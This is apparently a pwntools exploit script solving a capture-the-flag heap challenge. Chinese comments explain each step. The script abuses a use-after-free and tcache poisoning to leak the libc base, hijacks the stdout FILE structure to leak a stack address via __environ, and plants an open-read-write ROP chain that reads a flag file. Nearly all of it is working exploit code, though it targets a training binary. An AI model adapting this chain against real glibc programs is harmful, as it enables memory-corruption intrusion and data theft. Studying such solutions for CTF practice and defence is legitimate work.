from pwn import *
from requests import delete

io = process("./pwn")
# io = remote("node4.anna.nssctf.cn", 27566)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

context.log_level = "debug"


def select(id: int):
    io.recvuntil(b"Choice: ")
    io.sendline(str(id).encode())


def del_uaf(idx: int):
    select(666)
    io.recvuntil(b"Please input idx: ")
    io.sendline(str(idx).encode())
    print("uaf ", idx)


def show(idx: int):
    select(3)
    io.recvuntil(b"Please input idx: ")
    io.sendline(str(idx).encode())
    print("show ", idx)


def add(size: int, content: bytes):
    select(1)
    io.recvuntil(b"Please input size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Please input content: ")
    io.send(content)
    print("add ", hex(size))


def free(idx: int):
    select(2)
    io.recvuntil(b"Please input idx: ")
    io.sendline(str(idx).encode())
    print("free ", idx)


def _debug():
    gdb.attach(
        io,
        gdbscript="""
    decompiler connect ida
               """,
    )


for i in range(9):  # 0-8
    add(0x90, chr(i).encode() * 10)

add(0x20, b"9999999")  # 9

for i in range(7):
    free(i)  # 0-6

del_uaf(8)  # 8
show(8)  # 泄漏 libc

libc_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x1ECBE0
print("libc base address =", hex(libc_addr))
stdout_addr = libc_addr + libc.sym["_IO_2_1_stdout_"]
environ_addr = libc_addr + libc.sym["__environ"]
write_addr = libc_addr + libc.sym["write"]
read_addr = libc_addr + libc.sym["read"]
open_addr = libc_addr + libc.sym["open"]

pop_rdi = libc_addr + 0x23B6A
pop_rsi = libc_addr + 0x02601F
pop_rdx = libc_addr + 0x142C92

# 0xa0 tcache 仍是满地，7 不会进 tcache 而是与 8 向前合并，得到从 7 开始大小 0x140 的 unsorted chunk
free(7)  # 与 unsorted 的 8 合并
add(0x90, b"aaaaaaaa")  # 取走 chunk 腾出 tcache
# 8 现在是合并后 unsortedd chunk 内部的悬垂指针，
# free 掉会把它再放进 0xa0 tcache,造成重叠
free(8)
# 0x90 chunk，从 unsorted chunk 切出前半部分，余下部分正好覆盖到旧的 chunk header
add(0x80, b"bbbb")  # 0xb
# 旧的 headser 改 next 为 stdout_addr
add(0x80, p64(0) + p64(0xA1) + p64(stdout_addr))  # 0xc

add(0x90, b"dddd")  # 0xd

# 拿到 stdout 改写 FILE
add(
    0x90, p64(0xFBAD1887) + p64(0) * 3 + p64(environ_addr) + p64(environ_addr + 8) * 2
)  # 利用 stdout 泄漏 stack


environ_stack = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
print("environ stack address =", hex(environ_stack))

rbp = environ_stack - 0x128  # 找到地址

# open
orw = (
    b"./flag\x00\x00" + p64(pop_rdi) + p64(rbp) + p64(pop_rsi) + p64(0) + p64(open_addr)
)
# read
orw += (
    p64(pop_rdi)
    + p64(3)
    + p64(pop_rsi)
    + p64(environ_stack + 0x200)
    + p64(pop_rdx)
    + p64(0x50)
    + p64(read_addr)
)

# write
orw += p64(pop_rdi) + p64(1) + p64(pop_rdx) + p64(0x50) + p64(write_addr)

free(3)
free(2)

add(0x80, p64(0) + p64(0xA1) + p64(rbp))
add(0x90, b"eee")
add(0x90, orw)

io.interactive()
